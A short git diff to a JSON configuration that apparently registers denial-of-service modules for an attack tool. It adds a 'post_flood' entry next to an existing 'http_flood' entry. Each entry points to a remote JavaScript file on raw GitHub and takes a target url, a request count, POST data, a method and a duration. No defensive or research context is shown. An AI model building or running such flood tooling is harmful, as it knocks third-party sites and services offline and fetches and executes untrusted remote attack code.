@@ -1,12 +1,19 @@
 {
-   
     "http_flood": {
         "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/http_fload.js",
         "params": {
-            "target": {"required": true, "type": "string"},
+            "url": {"required": true, "type": "string"},
             "requests": {"required": true, "type": "number"},
-            "duration": {"required": false, "default": 10},
             "method": {"required": false, "default": "GET"}
+        }
+    },
+    "post_flood": {
+        "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/post_flood.js",
+        "params": {
+            "url": {"required": true, "type": "string"},
+            "requests": {"required": true, "type": "number"},
+            "data": {"required": false, "type": "string", "default": "test=123"},
+            "duration": {"required": false, "type": "number", "default": 10}
         }
     }
 }
